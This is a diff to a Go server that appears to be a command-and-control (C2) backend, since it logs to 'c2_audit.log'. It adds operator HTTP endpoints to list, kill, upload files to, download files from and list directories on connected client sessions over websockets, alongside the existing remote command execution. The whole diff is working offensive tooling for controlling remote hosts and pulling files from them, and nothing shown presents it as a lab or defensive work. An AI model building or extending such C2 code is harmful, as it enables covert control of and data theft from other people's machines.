@@ -20,6 +20,8 @@ import (
 	"github.com/gorilla/websocket"
 )
 
+var auditLog *log.Logger
+
 var upgrader = websocket.Upgrader{
 	CheckOrigin: func(r *http.Request) bool {
 		return true
@@ -56,18 +58,41 @@ func main() {
 	http.HandleFunc("/view", handleView)
 	http.HandleFunc("/op/sessions", corsOp(handleOpSessions))
 	http.HandleFunc("/op/exec", corsOp(handleOpExec))
+	http.HandleFunc("/op/health", corsOp(handleOpHealth))
+	http.HandleFunc("/op/kill", corsOp(handleOpKill))
+	http.HandleFunc("/op/upload", corsOp(handleOpUpload))
+	http.HandleFunc("/op/download", corsOp(handleOpDownload))
+	http.HandleFunc("/op/listdir", corsOp(handleOpListDir))
+
+	if f, err := os.OpenFile("c2_audit.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
+		auditLog = log.New(f, "", log.LstdFlags)
+	} else {
+		auditLog = log.New(os.Stdout, "[AUDIT] ", log.LstdFlags)
+	}
 
 	go runResponsePrinter()
-	go runOperator()
+	if isTTY(os.Stdin) {
+		go runOperator()
+	} else {
+		log.Printf("No TTY for stdin; operator REPL disabled. Use HTTP API: GET /op/sessions, POST /op/exec, POST /op/kill")
+	}
 
 	server := &http.Server{
 		Addr:      fmt.Sprintf(":%d", config.Port),
 		TLSConfig: tlsConfig,
 	}
 	log.Printf("Server starting on port %d", config.Port)
-	log.Printf("GET /sync  GET /view  WS /live  GET/POST /op/sessions, /op/exec")
+	log.Printf("GET /sync  GET /view  WS /live  GET /op/sessions, /op/health  POST /op/exec, /op/kill")
 	log.Printf("Operator: list | use <id> | exec <cmd> | exit")
 	log.Fatal(server.ListenAndServeTLS("", ""))
+}
+
+func isTTY(f *os.File) bool {
+	fi, err := f.Stat()
+	if err != nil {
+		return false
+	}
+	return (fi.Mode() & os.ModeCharDevice) != 0
 }
 
 func shortSessionID() string {
@@ -148,6 +173,9 @@ func runOperator() {
 				continue
 			}
 			cmdID := shortSessionID()
+			if auditLog != nil {
+				auditLog.Printf("exec stdin session=%s command=%s", selected, rest)
+			}
 			cm := common.Command{
 				Type: common.CmdExec,
 				ID:   cmdID,
@@ -343,6 +371,9 @@ func handleOpExec(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "bad request: need session_id and command", http.StatusBadRequest)
 		return
 	}
+	if auditLog != nil {
+		auditLog.Printf("exec api session=%s command=%s", req.SessionID, req.Command)
+	}
 	clientsMutex.Lock()
 	c, ok := clients[req.SessionID]
 	clientsMutex.Unlock()
@@ -386,6 +417,192 @@ func handleOpExec(w http.ResponseWriter, r *http.Request) {
 		pendingMutex.Unlock()
 		http.Error(w, "timeout waiting for response", http.StatusGatewayTimeout)
 	}
+}
+
+func handleOpHealth(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	clientsMutex.Lock()
+	n := len(clients)
+	clientsMutex.Unlock()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "sessions": n})
+}
+
+func handleOpKill(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	clientsMutex.Lock()
+	c, ok := clients[req.SessionID]
+	if ok {
+		delete(clients, req.SessionID)
+	}
+	clientsMutex.Unlock()
+	if !ok {
+		http.Error(w, "session not found", http.StatusNotFound)
+		return
+	}
+	c.Mu.Lock()
+	c.Conn.Close()
+	c.Mu.Unlock()
+	if auditLog != nil {
+		auditLog.Printf("kill session=%s", req.SessionID)
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
+}
+
+func opSendAndWait(sessionID string, cm common.Command) (ev responseEvent, ok bool) {
+	clientsMutex.Lock()
+	c, ok := clients[sessionID]
+	clientsMutex.Unlock()
+	if !ok {
+		return responseEvent{}, false
+	}
+	cmdID := shortSessionID()
+	cm.ID = cmdID
+	ch := make(chan responseEvent, 1)
+	pendingMutex.Lock()
+	pendingResponses[cmdID] = ch
+	pendingMutex.Unlock()
+	c.Mu.Lock()
+	err := c.Conn.WriteJSON(cm)
+	c.Mu.Unlock()
+	if err != nil {
+		pendingMutex.Lock()
+		delete(pendingResponses, cmdID)
+		pendingMutex.Unlock()
+		return responseEvent{}, false
+	}
+	select {
+	case ev := <-ch:
+		return ev, true
+	case <-time.After(120 * time.Second):
+		pendingMutex.Lock()
+		delete(pendingResponses, cmdID)
+		pendingMutex.Unlock()
+		return responseEvent{}, false
+	}
+}
+
+func handleOpUpload(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+		Path      string `json:"path"`
+		Content   string `json:"content"` // base64
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.Path == "" || req.Content == "" {
+		http.Error(w, "bad request: need session_id, path, content (base64)", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{
+		Type: common.CmdUpload,
+		Args: map[string]string{"path": req.Path, "content": req.Content},
+	})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpDownload(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+		Path      string `json:"path"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.Path == "" {
+		http.Error(w, "bad request: need session_id and path", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{
+		Type: common.CmdDownload,
+		Args: map[string]string{"path": req.Path},
+	})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpListDir(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+		Path      string `json:"path"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	path := req.Path
+	if path == "" {
+		path = "."
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{
+		Type: common.CmdListDir,
+		Args: map[string]string{"path": path},
+	})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
 }
 
 // handleView serves static files from ../view.
